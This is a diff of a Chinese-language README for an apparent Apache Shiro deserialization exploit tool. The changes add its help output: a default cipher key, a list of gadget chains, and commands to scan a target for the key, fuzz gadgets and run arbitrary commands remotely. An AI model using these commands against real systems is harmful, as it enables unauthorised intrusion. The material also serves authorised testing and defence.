@@ -16,28 +16,41 @@
 - 图形化？
 - 修复某些未知BUG
 
-
-由于Shiro在反序列化的时候无法加载除Java本身自带的数组，所以可利用的Gadget有限。
-
-目前可用Gadget:
+工具内置Gadget:
 - CommonsBeanUtilsNoCC
 - CommonsCollectionsK1
 - CommonsCollectionsK2
 - CommonsCollectionsK3
 - CommonsCollectionsK4
-- JRMPClient（需要在VPS上首先开启一个JRMPServer）
 
 ## Usage
 
 ```python
-java -jar dearshiro.jar -m {module} -b {baseurl} [-k] [-g] [-c]
+❯ java -jar dearshiro.jar --help
 
+Usage: <main class> [options]
+  Options:
+  * -m, --module
+      module
+  * -b, --baseurl
+      baseurl
+    -k, --key
+      key
+      Default: kPH+bIxk5D2deZiIxcaaaA==
+    -g, --gadget
+      gadget
+      Default: NoCC
+    -c, --command
+      command
+      Default: open -a Calculator
+    --help
+
+
+java -jar dearshiro.jar -m {module} -b {baseurl} [-k] [-g] [-c]
 # key module 扫描key
 java -jar dearshiro.jar -m "key" -b {baseurl}
-
 # dadgetfuzz module 扫描可用gadget
 java -jar dearshrio.jar -m "gadgetfuzz" -b {baseurl} -k {key}
-
 # gadgetexec module 使用gadget执行任意命令
 java -jar dearshiro.jar -m "gadgetexec" -b {baseurl} -k {key} -g {gadget} -c {command}
 ```
